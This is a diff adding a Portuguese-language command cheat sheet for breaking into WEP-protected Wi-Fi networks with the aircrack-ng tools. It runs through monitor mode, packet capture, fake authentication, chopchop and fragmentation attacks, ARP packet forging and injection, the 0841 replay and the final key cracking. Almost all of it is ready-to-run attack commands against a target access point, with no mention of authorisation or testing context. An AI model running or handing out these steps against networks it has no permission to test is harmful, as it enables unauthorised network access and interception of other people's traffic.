@@ -1,0 +1,63 @@
+Linha de comando:
+
+Mostrando dispositivos de rede:
+
+# ifconfig
+
+Ativando interface de monitoramento:
+
+# airmon-ng start wlan0
+
+Monitorando o ar:
+
+# airodump-ng wlan0mon
+
+Filtrando monitoramento e gravando em arquivo
+
+# airodump-ng wlan0mon -c <canal> --bssid <bssid da rede> -w <arquivo>
+
+Ataque de falsa autenticação
+
+# aireplay-ng -1 0 -e <essid> wlan0mon
+
+Ataque Chopchop
+
+Interceptar pacote com Chopchop
+
+# aireplay-ng -4 -b <bssid do alvo> -h <MAC placa>  wlan0mon
+
+Descobrindo IP do Gateway
+
+# tcpdump -s 0 -n -e -r <arquivo criado pelo chopchop>.cap
+
+Forjando pacote ARP
+
+# packetforge-ng -0 -a <bssid do alvo> -h <MAC da placa> -k <IP do Gataway> -l <IP de origem> -y <arquivo criado pelo chopchop>.xor -w <arquivo ARP>
+
+Injetando pacotes forjados
+
+# aireplay-ng -2 -r <arquivo ARP> wlan0mon
+
+Ataque Fragmentation
+
+Interceptar pacote com Fragmentation
+
+# aireplay-ng -5 -b <bssid do alvo> -h <MAC placa>  wlan0mon
+
+Forjando pacote ARP
+
+# packetforge-ng -0 -a <bssid do alvo> -h <MAC da placa> -k <IP do Gataway> -l <IP de origem> -y <arquivo criado pelo fragmentation>.xor -w <arquivo ARP>
+
+Injetando pacotes forjados
+
+# aireplay-ng -2 -r <arquivo ARP> wlan0mon
+
+Ataque 0841
+
+Interceptar e reinjetar com método 0841
+
+# aireplay-ng -2 -p 0841 -c FF:FF:FF:FF:FF:FF -b <bssid do alvo> -h <MAC da placa>  wlan0mon
+
+Quebrando a senha
+
+# aircrack-ng <arquivo>.cap
